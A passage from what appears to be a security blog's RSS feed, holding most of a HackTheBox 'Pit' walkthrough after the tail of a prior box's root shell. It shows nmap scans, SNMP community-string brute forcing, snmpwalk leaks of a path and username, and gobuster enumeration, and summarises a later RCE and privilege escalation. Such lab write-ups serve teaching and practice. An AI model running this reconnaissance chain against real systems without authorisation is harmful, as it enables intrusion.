<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
root@cap:/var/www/html# <span class="nb">cd</span> /root/
root@cap:/root# ls -l
total <span class="m">8</span>
-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun  <span class="m">9</span> 04:59 root.txt
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">23</span> 19:17 snap
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Pit</title>
      <link>https://fahmifj.github.io/hackthebox/pit/</link>
      <pubDate>Wed, 13 Oct 2021 16:54:04 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/pit/</guid>
      <description>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow.</description>
      <content:encoded><![CDATA[<p>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS, where I can login with that username. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a <a href="https://cockpit-project.org/">Cockpit</a> instance. Enumerating the system from Cockpit&rsquo;s terminal reveals that each time a &ldquo;walk&rdquo; is performed, SNMP will execute a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SNMP enumeration and exploitation</li>
<li>SeedDMS exploitation</li>
<li>Cockpit exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>snmpwalk</li>
<li>gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="tcp">TCP</h4>
<p>For TCP ports, <code>nmap</code> discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that <code>nmap</code> identifies it as zeus-admin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:03 EDT
Nmap scan report <span class="k">for</span> 10.10.10.241
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.079s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> filtered ports
Reason: <span class="m">65332</span> no-responses and <span class="m">200</span> admin-prohibiteds
PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl <span class="m">63</span> OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp   open  http            syn-ack ttl <span class="m">63</span> nginx 1.14.1
9090/tcp open  ssl/zeus-admin? syn-ack ttl <span class="m">63</span>
...<span class="o">[</span>SNIP<span class="o">]</span>...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 401.69 seconds
→ root@kali «pit» «10.10.14.49» 
$ nmap -p22,80,9090 --max-rate <span class="m">1000</span> -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:12 EDT
Nmap scan report <span class="k">for</span> 10.10.10.241
Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.

PORT     STATE SERVICE
22/tcp   open  ssh
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http
<span class="p">|</span>_http-title: Test Page <span class="k">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  zeus-admin
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
<span class="p">|</span> Not valid before: 2020-04-16T23:29:12
<span class="p">|</span>_Not valid after:  2030-06-04T16:09:12
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.39 seconds
</code></pre></div><p>Also, <code>nmap</code> revealed a domain name <code>dms-pit.htb</code> from the SSL certificate on port 9090. I will add it to my <code>/etc/hosts</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.241 dms-pit.htb pit.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="udp">UDP</h4>
<p>For UDP ports, <code>nmap</code> discovers an SNMP server on port 161 and reveals a domain name <code>pit.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ nmap -sU -sV -n --top-ports <span class="m">20</span> -oA nmap/10-udp-top20-pit 10.10.10.241
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:18 EDT
Nmap scan report <span class="k">for</span> 10.10.10.241
Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.

PORT      STATE         SERVICE      VERSION
53/udp    open<span class="p">|</span>filtered domain
67/udp    open<span class="p">|</span>filtered dhcps
68/udp    filtered      dhcpc
69/udp    open<span class="p">|</span>filtered tftp
123/udp   open<span class="p">|</span>filtered ntp
135/udp   open<span class="p">|</span>filtered msrpc
137/udp   open<span class="p">|</span>filtered netbios-ns
138/udp   filtered      netbios-dgm
139/udp   open<span class="p">|</span>filtered netbios-ssn
161/udp   open          snmp         SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
162/udp   open<span class="p">|</span>filtered snmptrap
445/udp   filtered      microsoft-ds
500/udp   open<span class="p">|</span>filtered isakmp
514/udp   filtered      syslog
520/udp   open<span class="p">|</span>filtered route
631/udp   open<span class="p">|</span>filtered ipp
1434/udp  open<span class="p">|</span>filtered ms-sql-m
1900/udp  filtered      upnp
4500/udp  open<span class="p">|</span>filtered nat-t-ike
49152/udp open<span class="p">|</span>filtered unknown
Service Info: Host: pit.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.21 seconds
</code></pre></div><h3 id="poking-the-websites">Poking the websites</h3>
<p>For HTTP, it seems only <code>dms-pit.htb</code> that serves different content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ curl -s http://10.10.10.241/ <span class="p">|</span> wc -c                                 
<span class="m">4057</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s http://pit.htb/ <span class="p">|</span> wc -c
<span class="m">4057</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s http://dms-pit.htb/ <span class="p">|</span> wc -c
<span class="m">169</span>
</code></pre></div><p>For HTTPS on port 9090, it&rsquo;s all the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49» 
$ curl -s -k https://10.10.10.241:9090/ <span class="p">|</span> wc -c
<span class="m">43548</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s -k https://pit.htb:9090/ <span class="p">|</span> wc -c
<span class="m">43548</span>
→ root@kali «pit» «10.10.14.49» 
$ curl -s -k https://dms-pit.htb:9090/ <span class="p">|</span> wc -c
<span class="m">43548</span>
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, a NGINX default web page for REHL is shown here.</p>
<p><div class="img-container"><img src="imgs/image-20210520224354684.png" alt="image-20210520224354684"  /></div>
</p>
<p>Running <code>gobuster</code> against this site doesn&rsquo;t really find something useful, and I couldn&rsquo;t find a critical vulnerability on <code>nginx 1.14.1</code>.</p>
<h3 id="tcp-80---dms-pithtb">TCP 80 - dms-pit.htb</h3>
<p>Heading to <code>dms-pit.htb</code> on port 80 shows a 403 forbidden error message.</p>
<p><div class="img-container"><img src="imgs/image-20210520224457026.png" alt="image-20210520224457026"  /></div>
</p>
<p>For this site, <code>gobuster</code> actually found some files, but all of them returned with 403 status.</p>
<h3 id="tcp-9090---website-https">TCP 9090 - Website (HTTPS)</h3>
<p>On port 9090, there is a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210520225003343.png" alt="image-20210520225003343"  /></div>
</p>
<p>This page was identified as an instance of <a href="https://cockpit-project.org/.">Cockpit</a>, a web-based interface for system administration.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>There is a security issue on GitHub which talks about SSRF:</p>
<ul>
<li><a href="https://github.com/cockpit-project/cockpit/issues/15077">https://github.com/cockpit-project/cockpit/issues/15077</a></li>
</ul>
<p>The researcher disclosed the issue in his blog.</p>
<ul>
<li><a href="https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850">https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850</a></li>
</ul>
<p>The researcher also provides a PoC, but it requires an account, so I will move on to the next service.</p>
<h3 id="udp-161---snmp">UDP 161 - SNMP</h3>
<p>From what <code>nmap</code> gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp">HackTricks</a>, to enumerate SNMP version 1/2c, I need to know the community string name, and there are two types of it: <code>public</code> and <code>private</code>.</p>
<p>The <code>public</code> community string normally grants read access, however <code>private</code> may grant you read/write access, even leading to <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce">remote code execution</a>.</p>
<p>For SNMP version 1 and 2c, it is possible to identify a valid community string based on the server&rsquo;s response with a dictionary attack (brute) . In Kali, there is a preinstalled tool for this, which I will use called <code>onesixtyone</code>. I will run it and save the output to a file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 &gt; snmp-enum/brute-community-strings
</code></pre></div><p>The attack reveals that <strong>public</strong> is a valid community string.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ cat snmp-enum/brute-community-strings
Scanning <span class="m">1</span> hosts, <span class="m">3220</span> communities
10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
10.10.10.241 <span class="o">[</span>public<span class="o">]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class="c1">#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</code></pre></div><p>Now to enumerate SNMP, I will use another preinstalled tool called <code>snmpwalk</code>. Using this tool will return a list of <a href="https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids">OID (Objects Identifiers)</a> which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need <code>snmp-mibs-downloader</code>. I will install that with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ apt-get install snmp-mibs-downloader
</code></pre></div><p>The general usage for <code>snmpwalk</code> is:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ snmpwalk <span class="o">[</span>OPTIONS<span class="o">]</span> AGENT <span class="o">[</span>OID<span class="o">]</span>
</code></pre></div><p>Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is <code>1.3.6.1</code>, so that it would  &ldquo;walk&rdquo; down to any readable OID branch, it is something like <code>1.3.6.1</code> -&gt; <code>1.3.6.1.1</code> (directory OID) -&gt; &hellip; -&gt;  <code>1.3.6.1.4</code> (private OID) -&gt; &hellip; -&gt; <code>1.3.6.1.X.X</code>.</p>
<p>I will run <code>snmpwalk</code> on that and save the output to <code>snmp-internet-1.3.6.1.out</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ snmpwalk -v 2c -c public 10.10.10.241 internet &gt; snmp-internet-1.3.6.1.out
</code></pre></div><ul>
<li><code>-v</code> 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth.</li>
<li><code>-c</code> public: community string</li>
<li><code>internet</code>: auto translated to 1.3.6.1 by <code>snmp-mibs-downloader</code></li>
</ul>
<p>I will filter the output with <code>hrSWRunParameters</code> (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn&rsquo;t have any.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ cat snmp-enum/snmp-internet-1.3.6.1.out <span class="p">|</span> grep <span class="s2">&#34;hrSWRunParameters&#34;</span> <span class="p">|</span> grep STRING
HOST-RESOURCES-MIB::hrSWRunParameters.1 <span class="o">=</span> STRING: <span class="s2">&#34;--switched-root --system --deserialize 17&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1000 <span class="o">=</span> STRING: <span class="s2">&#34;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1001 <span class="o">=</span> STRING: <span class="s2">&#34;--foreground&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1002 <span class="o">=</span> STRING: <span class="s2">&#34;--no-debug&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1004 <span class="o">=</span> STRING: <span class="s2">&#34;-s&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1009 <span class="o">=</span> STRING: <span class="s2">&#34;-i --logger=files&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1011 <span class="o">=</span> STRING: <span class="s2">&#34;-f --fill-watermark=0&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1041 <span class="o">=</span> STRING: <span class="s2">&#34;--domain implicit_files --uid 0 --gid 0 --logger=files&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1051 <span class="o">=</span> STRING: <span class="s2">&#34;--uid 0 --gid 0 --logger=files&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1056 <span class="o">=</span> STRING: <span class="s2">&#34;-s /usr/sbin/firewalld --nofork --nopid&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1090 <span class="o">=</span> STRING: <span class="s2">&#34;--no-daemon&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1101 <span class="o">=</span> STRING: <span class="s2">&#34;-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1105 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/sbin/tuned -l -P&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1116 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1193 <span class="o">=</span> STRING: <span class="s2">&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1208 <span class="o">=</span> STRING: <span class="s2">&#34;--basedir=/usr&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1479 <span class="o">=</span> STRING: <span class="s2">&#34;-n&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1481 <span class="o">=</span> STRING: <span class="s2">&#34;-LS0-6d -f&#34;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.10212 <span class="o">=</span> STRING: <span class="s2">&#34;-Es /usr/share/setroubleshoot/SetroubleshootFixit.py&#34;</span>
</code></pre></div><p>If I examine the entire output carefully, the two most interesting information are:</p>
<ul>
<li>A web path <code>/var/www/html/seeddms51x/seeddms</code>, and</li>
<li>A potential username: <code>michelle</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">UCD-SNMP-MIB::dskPath.2 <span class="o">=</span> STRING: /var/www/html/seeddms51x/seeddms
UCD-SNMP-MIB::dskDevice.1 <span class="o">=</span> STRING: /dev/mapper/cl-root
UCD-SNMP-MIB::dskDevice.2 <span class="o">=</span> STRING: /dev/mapper/cl-seeddms
...<span class="o">[</span>SNIP<span class="o">]</span>...
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span class="o">=</span> INTEGER: <span class="m">1</span>
NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">5</span>
NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: exec<span class="o">(</span>1<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: run-on-read<span class="o">(</span>1<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: permanent<span class="o">(</span>4<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: active<span class="o">(</span>1<span class="o">)</span>
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">31</span>
NET-SNMP-EXTEND-MIB::nsExtendResult.<span class="s2">&#34;monitoring&#34;</span> <span class="o">=</span> INTEGER: <span class="m">0</span>
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.1 <span class="o">=</span> STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.2 <span class="o">=</span> STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.3 <span class="o">=</span> STRING: Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.4 <span class="o">=</span> STRING: Swap:         1.9Gi          0B       1.9Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.5 <span class="o">=</span> STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.6 <span class="o">=</span> STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.7 <span class="o">=</span> STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.8 <span class="o">=</span> STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.9 <span class="o">=</span> STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.10 <span class="o">=</span> STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.11 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.12 <span class="o">=</span> STRING:                 Labeling   MLS/       MLS/                          
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.13 <span class="o">=</span> STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.14 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.15 <span class="o">=</span> STRING: guest_u         user       s0         s0                             guest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.16 <span class="o">=</span> STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.17 <span class="o">=</span> STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.18 <span class="o">=</span> STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.19 <span class="o">=</span> STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.20 <span class="o">=</span> STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.21 <span class="o">=</span> STRING: user_u          user       s0         s0                             user_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.22 <span class="o">=</span> STRING: xguest_u        user       s0         s0                             xguest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.23 <span class="o">=</span> STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.24 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.25 <span class="o">=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.26 <span class="o">=</span> STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.27 <span class="o">=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.28 <span class="o">=</span> STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.29 <span class="o">=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.30 <span class="o">=</span> STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> STRING:  14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> No more variables left in this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span>
</code></pre></div><p>I will also notice that some of the output lines starting with <code>NET-SNMP-EXTEND-MIB</code> are similar to the output from some Linux command utilities such as <code>uptime</code> and <code>free -h</code>.</p>
<h3 id="seeddms-tcp-80">SeedDMS (TCP 80)</h3>
<p>From the enumeration above, a web directory was revealed at <code>/var/www/html/seeddms51x/seeddms</code> by <code>snmpwalk</code>. Since the directory path contains a &ldquo;dms&rdquo; string, I tried to append the path name to <code>http://dms-pit.htb</code>.</p>
<p>And then when I enter <code>http://dms-pit.htb/seeddms51x/seeddms</code>, it redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210521014642036.png" alt="image-20210521014642036"  /></div>
</p>
<p>A quick search for &ldquo;SeedDMS&rdquo; on Google pops <a href="https://www.seeddms.org/index.php?id=2">this link</a>. It states that SeedDMS is:</p>
<blockquote>
<p>A free document management system with an easy to use web  based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many  years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.</p>
</blockquote>
<h4 id="gobuster">Gobuster</h4>
<p>This time <code>gobuster</code> reveals some accessible items.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «pit» «10.10.14.49»
$ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t <span class="m">10</span> -b 403,404 -r
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span> Url:                     http://dms-pit.htb/seeddms51x/seeddms/
<span class="o">[</span>+<span class="o">]</span> Method:                  GET
<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
<span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
<span class="o">[</span>+<span class="o">]</span> Follow Redirect:         <span class="nb">true</span>
<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
<span class="o">===============================================================</span>
2021/05/20 15:13:54 Starting gobuster in directory enumeration <span class="nv">mode</span>
<span class="o">===============================================================</span>
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7359<span class="o">]</span>
/CHANGELOG            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 101652<span class="o">]</span>
/LICENSE              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18321<span class="o">]</span>
/TODO                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2844<span class="o">]</span>
/Guests.php           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
/GuideImages.php      <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
/HB.php               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
